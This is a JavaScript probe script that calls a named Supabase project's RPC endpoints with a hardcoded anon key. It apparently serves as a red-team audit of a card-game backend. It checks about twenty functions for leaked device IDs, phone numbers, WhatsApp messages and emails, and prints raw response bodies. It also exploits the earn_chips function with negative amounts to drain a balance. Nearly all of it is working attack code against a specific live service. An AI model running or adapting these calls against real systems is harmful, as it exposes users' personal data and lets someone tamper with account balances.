const URL='https://gxrpunvhjcrzqnitbqah.supabase.co';
const ANON='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imd4cnB1bnZoamNyenFuaXRicWFoIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzMzNTc5OTksImV4cCI6MjA4ODkzMzk5OX0.MLHYIbU4saCHq0eQbwUzyfAl_q9TLgepKf8iNDDav-Q';
const rpc=async(n,a)=>{const r=await fetch(`${URL}/rest/v1/rpc/${n}`,{method:'POST',headers:{apikey:ANON,Authorization:`Bearer ${ANON}`,'Content-Type':'application/json'},body:JSON.stringify(a||{})});return {s:r.status,b:(await r.text())};};
const has=(b,...k)=>k.filter(x=>b.includes(x));
const show=(label,r)=>{const leak=has(r.b,'device_id','"user_id"','phone','whatsapp','+9','email','receipt');console.log(`  ${label.padEnd(40)} ${r.s}  len=${r.b.length}  ${leak.length?'⚠️LEAKS: '+leak.join(','):''}`);};

console.log('== 1 · does any read RPC leak real DEVICE IDS or PII? (the account is the device id) ==');
for(const [n,a] of [
  ['get_leaderboard',{p_limit:5}],
  ['get_leaderboard',{p_device_id:'RT-X',p_limit:5}],
  ['get_elo_leaderboard',{p_limit:5}],
  ['list_public_tables',{}],
  ['list_open_tables',{}],
  ['get_play_of_the_day',{}],
  ['get_play_of_the_day_v2',{}],
  ['get_sng_activity_feed',{p_device_id:'RT-X',p_limit:5}],
  ['get_caps_launch_dashboard',{}],
  ['get_live_dashboard',{}],
  ['get_analytics_dashboard',{p_days:1}],
  ['get_caps_dashboard',{}],
  ['dashboard',{}],
  ['get_pending_whatsapp_messages',{}],
  ['get_bug_tracker',{}],
  ['get_bug_triage',{}],
  ['get_daily_digest',{}],
  ['get_push_dashboard',{}],
  ['get_funnel_dashboard',{p_days:1}],
  ['get_retention_analytics',{p_days:1}],
  ['self_describe',{}],
  ['health_check',{}],
]) show(n, await rpc(n,a));

console.log('\n== 2 · a sample of what get_leaderboard actually returns (first 400 chars) ==');
console.log('  ', (await rpc('get_leaderboard',{p_limit:3})).b.slice(0,400));
console.log('\n== whatsapp messages body (first 300) ==');
console.log('  ', (await rpc('get_pending_whatsapp_messages',{})).b.slice(0,300));
console.log('\n== bug tracker body (first 300) ==');
console.log('  ', (await rpc('get_bug_tracker',{})).b.slice(0,300));

console.log('\n== 3 · CHANGE another player\'s data: earn_chips negative drain (on MY OWN device RT-DRAIN) ==');
// seed RT-DRAIN with a starting row first via a benign grant, then drain it below zero
await rpc('earn_chips',{p_device_id:'RT-DRAIN',p_event_type:'hand_won',p_amount:100});
for(let i=1;i<=4;i++){ const r=await rpc('earn_chips',{p_device_id:'RT-DRAIN',p_event_type:'hand_won',p_amount:-500}); console.log(`  drain ${i}: ${r.b.slice(0,80)}`); }
